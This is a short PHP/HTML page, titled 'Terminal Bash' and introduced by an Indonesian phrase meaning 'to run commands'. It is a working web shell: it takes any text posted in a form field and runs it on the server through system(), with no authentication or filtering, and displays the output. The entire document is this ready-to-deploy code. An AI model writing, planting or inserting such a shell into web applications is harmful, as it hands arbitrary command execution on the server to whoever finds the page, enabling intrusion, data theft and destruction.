 untuk menjalankan perintah

<html>
  <head>
    <title>Terminal Bash</title>
    <style type="text/css">
      body {
        font-family: monospace;
        background-color: #000;
        color: #0f0;
      }
    </style>
  </head>
  <body>
    <div>
      <?php
        $command = $_POST['command'];
        if ($command) {
          echo '<pre>';
          system($command);
          echo '</pre>';
        }
      ?>
    </div>
    <form action="" method="post">
      <input type="text" name="command" placeholder="Masukkan Perintah" autofocus>
      <input type="submit" value="Jalankan">
    </form>
  </body>
</html>

